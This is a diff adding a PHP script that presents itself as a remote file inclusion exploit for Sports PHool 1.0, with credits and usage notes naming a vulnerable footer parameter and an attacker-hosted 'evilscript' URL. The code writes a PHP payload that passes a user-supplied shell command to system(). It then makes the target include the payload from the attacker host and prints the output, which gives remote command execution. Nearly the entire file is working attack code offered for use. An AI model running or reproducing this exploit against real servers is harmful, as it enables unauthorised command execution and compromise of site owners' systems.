@@ -1,0 +1,58 @@
+<?php
+
+/*
+Sports PHool <= 1.0 Remote File Include Exploit
+Found and c0ded by cr4wl3r @hackb0x
+d0rk: no d0rk f0r kiddi0ts
+Script:  http://sourceforge.net/projects/sportsphool/files/
+
+usage:
+target: http://target/sportsphool/includes/layout/plain.footer.php?mainnav=
+evil: http://hackb0x/evilscript.txt?
+
+*/
+
+$cmd = $_POST["cmd"];
+$target = $_POST["target"];
+$evil = $_POST["evil"];
+
+$form= "<form method=\"post\" action=\"".$PHP_SELF."\">"
+    ."target:<br><input type=\"text\" name=\"target\" size=\"90\" value=\"".$target."\"><br>"
+    ."evil:<br><input type=\"text\" name=\"evil\" size=\"90\" value=\"".$evil."\"><br>"
+    ."cmd:<br><input type=\"text\" name=\"cmd\" size=\"90\" value=\"".$cmd."\"><br>"
+    ."<input type=\"submit\" value=\"Submit\" name=\"submit\">"
+    ."</form><HR WIDTH=\"650\" ALIGN=\"LEFT\">";
+
+if (!isset($_POST['submit'])) 
+{
+
+echo $form;
+
+}else{
+
+$file = fopen ("test.txt", "w+");
+
+fwrite($file, "<?php system(\"echo ++BEGIN++\"); system(\"".$cmd."\"); 
+system(\"echo ++END++\"); ?>");
+fclose($file);
+
+$file = fopen ($target.$evil, "r");
+if (!$file) {
+    echo "<p>Unable to get output.\n";
+    exit;
+}
+
+echo $form;
+
+while (!feof ($file)) {
+    $line .= fgets ($file, 1024)."<br>";
+    }
+$tpos1 = strpos($line, "++BEGIN++");
+$tpos2 = strpos($line, "++END++");
+$tpos1 = $tpos1+strlen("++BEGIN++");
+$tpos2 = $tpos2-$tpos1;
+$output = substr($line, $tpos1, $tpos2);
+echo $output;
+
+}
+?>
